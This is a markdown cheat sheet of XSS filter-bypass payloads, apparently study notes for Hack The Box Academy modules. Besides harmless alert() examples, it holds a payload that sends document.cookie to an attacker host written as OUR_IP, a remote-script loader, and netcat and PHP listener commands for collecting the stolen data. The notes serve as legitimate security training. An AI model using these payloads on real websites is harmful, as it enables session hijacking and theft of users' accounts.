# XSS and CSRF
- [HTB Cross-Site Scripting (XSS) Module](https://academy.hackthebox.com/module/103/section/965)
- [HTB Advanced XSS and CSRF Exploitation Module](https://academy.hackthebox.com/module/235/section/2653)
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)

## XSS Filter Bypasses
### Weak Blacklists
- Casing: `<ScRiPt>alert(1);</ScRiPt>`
- Casing: `<object data="JaVaScRiPt:alert(1)">`
- Casing: `<img src=x OnErRoR=alert(1)>`
- No Space: `<svg/onload=alert(1)>`

### JavaScript Encodings
- Unicode: `"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"`
- Octal: `"\141\154\145\162\164\50\61\51"`
- Hex: `"\x61\x6c\x65\x72\x74\x28\x31\x29"`
- Base64: `atob("YWxlcnQoMSk=")`

### String Creation
- fromCharCode: `String.fromCharCode(97,108,101,114,116,40,49,41)`
- source: `/alert(1)/.source`
- URL Encoding: `decodeURI(/alert(%22xss%22)/.source)`

### Execution Sinks:
- eval: `eval("alert(1)")`
- setTimeout: `setTimeout("alert(1)")`
- setInterval: `setInterval("alert(1)")`
- Function: `Function("alert(1)")()`
- constructor: `[].constructor.constructor(alert(1))()`

---

# HTB Cheat Sheet
## XSS Payloads
| Code | Description |
|------|-------------|
| `<script>alert(window.origin)</script>` | Basic XSS Payload |
| `<plaintext>` | Basic XSS Payload |
| `<script>print()</script>` | Basic XSS Payload |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |

## Commands

| Code | Description |
|------|-------------|
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80` | Start `netcat` listener |
| `sudo php -S 0.0.0.0:80` | Start `PHP` server |
